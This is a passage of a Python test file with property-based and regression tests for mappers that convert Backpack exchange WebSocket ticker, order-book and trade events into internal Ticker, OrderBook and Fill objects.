        base_event: BackpackRawTickerEvent,
        ticker_mapper: BackpackTickerMapper,
    ) -> None:
        """Property: WebSocket transformations should handle large inputs safely."""
        large_ticker = BackpackRawTickerEvent(
            s=large_symbol,
            c=base_event.last_price,
            h=base_event.high,
            l=base_event.low,
            o=base_event.open_price,
            v=base_event.volume,
            V=base_event.quote_volume,
            priceChangePercent=base_event.price_change_percent,
            e="ticker",
            E=base_event.event_time,
        )

        try:
            result = ticker_mapper.transform_ws_ticker_event_to_internal(large_ticker)

            # Should produce reasonable output size
            result_str = str(result)
            assert len(result_str) <= max(len(large_symbol), 10000)

        except (TransformationError, ValueError, MemoryError):
            # Rejection or memory protection is acceptable
            pass

    @given(
        unicode_data=st.text(
            alphabet=st.characters(
                min_codepoint=0x1F300,  # Emoji range
                max_codepoint=0x1F5FF,
            ),
            min_size=1,
            max_size=50,
        ),
        base_event=ticker_event_strategy(),
    )
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_websocket_transformation_unicode_handling(
        self,
        unicode_data: str,
        base_event: BackpackRawTickerEvent,
        ticker_mapper: BackpackTickerMapper,
    ) -> None:
        """Property: WebSocket transformations should handle Unicode data safely."""
        unicode_ticker = BackpackRawTickerEvent(
            s=f"{base_event.symbol}-{unicode_data}",
            c=base_event.last_price,
            h=base_event.high,
            l=base_event.low,
            o=base_event.open_price,
            v=base_event.volume,
            V=base_event.quote_volume,
            priceChangePercent=base_event.price_change_percent,
            e="ticker",
            E=base_event.event_time,
        )

        try:
            result = ticker_mapper.transform_ws_ticker_event_to_internal(unicode_ticker)

            # Unicode should be preserved exactly
            assert unicode_data in result.symbol.value

            # Should be JSON serializable
            json.dumps(str(result))

        except (TransformationError, ValueError, UnicodeError):
            # Rejection is acceptable for problematic Unicode
            pass


# =============================================================================
# INTEGRATION PROPERTY TESTS
# =============================================================================


class TestWebSocketTransformationIntegrationProperties:
    """Integration property tests for WebSocket transformation workflows."""

    @given(
        mixed_events=st.lists(
            st.one_of([ticker_event_strategy(), depth_event_strategy(), trade_event_strategy()]),
            min_size=1,
            max_size=10,
        )
    )
    @settings(max_examples=50, deadline=timedelta(seconds=1))
    def test_mixed_event_processing_consistency(
        self,
        mixed_events: list[
            BackpackRawTickerEvent
            | tuple[BackpackRawDepthUpdateEvent, str]
            | BackpackRawPublicTradeEvent
        ],
        ticker_mapper: BackpackTickerMapper,
        order_book_mapper: BackpackOrderBookMapper,
        trade_mapper: BackpackFillMapper,
    ) -> None:
        """Property: Mixed event processing should be consistent and error-free."""
        results: list[Ticker | OrderBook | Fill] = []

        for event in mixed_events:
            try:
                result: Ticker | OrderBook | Fill
                if isinstance(event, BackpackRawTickerEvent):
                    result = ticker_mapper.transform_ws_ticker_event_to_internal(event)
                elif isinstance(event, tuple) and len(event) == 2:  # Depth event
                    # Unpack tuple directly since type is known
                    raw_depth, symbol_str = event
                    symbol = exchanges.backpack(symbol_str)
                    result = order_book_mapper.transform_ws_depth_event_to_internal(
                        symbol, raw_depth
                    )
                else:  # BackpackRawPublicTradeEvent
                    # Skip invalid trades
                    try:
                        price_decimal = Decimal(event.price)
                        qty_decimal = Decimal(event.quantity)
                        if price_decimal <= Decimal(0) or qty_decimal <= Decimal(0):
                            continue
                    except (ValueError, TypeError, OverflowError):
                        continue
                    result = trade_mapper.transform_ws_fill_event_to_internal_fill(event)

                results.append(result)
            except (ValueError, TypeError, OverflowError, AttributeError):
                continue

        # Property: All successful transformations should be valid
        for result in results:
            assert hasattr(result, "symbol")
            assert hasattr(result, "exchange") or isinstance(result, OrderBook)

            if isinstance(result, OrderBook):
                # OrderBook doesn't have exchange attribute, check symbol instead
                assert result.symbol.exchange == ExchangeName.BACKPACK
            elif hasattr(result, "exchange"):
                assert result.exchange == ExchangeName.BACKPACK.value

    @given(event_stream=st.lists(trade_event_strategy(), min_size=5, max_size=20))
    @settings(max_examples=30, deadline=timedelta(seconds=1))
    def test_real_time_event_stream_processing(
        self, event_stream: list[BackpackRawPublicTradeEvent], trade_mapper: BackpackFillMapper
    ) -> None:
        """Property: Real-time event stream processing should maintain data integrity."""
        processed_trades: list[tuple[BackpackRawPublicTradeEvent, Fill]] = []

        for trade_event in event_stream:
            try:
                # Skip invalid trades
                price_decimal = Decimal(trade_event.price)
                qty_decimal = Decimal(trade_event.quantity)
                if price_decimal <= Decimal(0) or qty_decimal <= Decimal(0):
                    continue

                result = trade_mapper.transform_ws_fill_event_to_internal_fill(trade_event)
                processed_trades.append((trade_event, result))
            except (ValueError, TypeError, OverflowError, AttributeError):
                continue

        # Property: Processed trades should maintain temporal ordering
        if len(processed_trades) > 1:
            for i in range(1, len(processed_trades)):
                prev_event, prev_result = processed_trades[i - 1]
                curr_event, curr_result = processed_trades[i]

                # If timestamps are different, ordering should be preserved
                if prev_event.engine_timestamp != curr_event.engine_timestamp:
                    assert prev_result.executed_at <= curr_result.executed_at

        # Property: All trades should have consistent transformation
        for trade_event, result in processed_trades:
            assert result.price == Decimal(trade_event.price)
            assert result.quantity == Decimal(trade_event.quantity)
            expected_side = OrderSide.BUY if trade_event.is_buyer_the_maker else OrderSide.SELL
            assert result.side == expected_side


# =============================================================================
# LEGACY COMPATIBILITY TESTS
# =============================================================================


def test_ticker_transformation_compatibility() -> None:
    """Test ticker transformation for regression verification."""
    mapper = BackpackTickerMapper()

    event = BackpackRawTickerEvent(
        s="SOL-USDC",
        c="100.50",
        h="101.00",
        l="99.50",
        o="100.00",
        v="1000.0",
        V="100500.0",
        priceChangePercent="0.5",
        e="ticker",
        E=1705314600000,
    )

    result = mapper.transform_ws_ticker_event_to_internal(event)

    assert result.symbol == SOL_USDC_BP
    assert result.price == Decimal("100.50")
    assert result.timestamp == datetime(2024, 1, 15, 10, 30, 0, tzinfo=UTC)


def test_depth_transformation_compatibility() -> None:
    """Test depth transformation for regression verification."""
    mapper = BackpackOrderBookMapper()

    event = BackpackRawDepthUpdateEvent(
        u="12345",
        U="12340",
        b=[("100.25", "10.0"), ("100.00", "5.0")],
        a=[("100.75", "8.0"), ("101.00", "12.0")],
        e="depth",
        E=1705314600000,
        T=1705314600001,
    )

    result = mapper.transform_ws_depth_event_to_internal(SOL_USDC_BP, event)

    assert len(result.bids) == 2
    assert len(result.asks) == 2
    assert result.bids[0] == (Decimal("100.25"), Decimal("10.0"))
    assert result.asks[0] == (Decimal("100.75"), Decimal("8.0"))


def test_trade_transformation_compatibility() -> None:
    """Test trade transformation for regression verification."""
    mapper = BackpackFillMapper()

    event = BackpackRawPublicTradeEvent(
        s="SOL-USDC",
        p="100.50",
        q="10.0",
        t="trade123",
        m=False,
        e="trade",
        E=1705314600000,
        b="buyer123",
        a="seller123",
        T=1705314600000,
    )

    result = mapper.transform_ws_fill_event_to_internal_fill(event)

    assert result.symbol == SOL_USDC_BP
    assert result.price == Decimal("100.50")
    assert result.quantity == Decimal("10.0")
    assert result.side == OrderSide.SELL  # m=False -> SELL
    assert result.exchange == ExchangeName.BACKPACK.value


def test_trade_side_mapping_compatibility() -> None:
    """Test trade side mapping for regression verification."""
    mapper = BackpackFillMapper()

    # Buyer is maker -> BUY side
    buy_event = BackpackRawPublicTradeEvent(
        s="SOL-USDC",
        p="100.50",
        q="10.0",
        t="trade1",
        m=True,
        e="trade",
        E=1705314600000,
        b="buyer",
        a="seller",
        T=1705314600000,
    )

    buy_result = mapper.transform_ws_fill_event_to_internal_fill(buy_event)
    assert buy_result.side == OrderSide.BUY

    # Buyer is not maker -> SELL side
    sell_event = BackpackRawPublicTradeEvent(
        s="SOL-USDC",
        p="100.50",
        q="10.0",
        t="trade2",
        m=False,
        e="trade",
        E=1705314600000,
        b="buyer",
        a="seller",
        T=1705314600000,
    )

    sell_result = mapper.transform_ws_fill_event_to_internal_fill(sell_event)
    assert sell_result.side == OrderSide.SELL
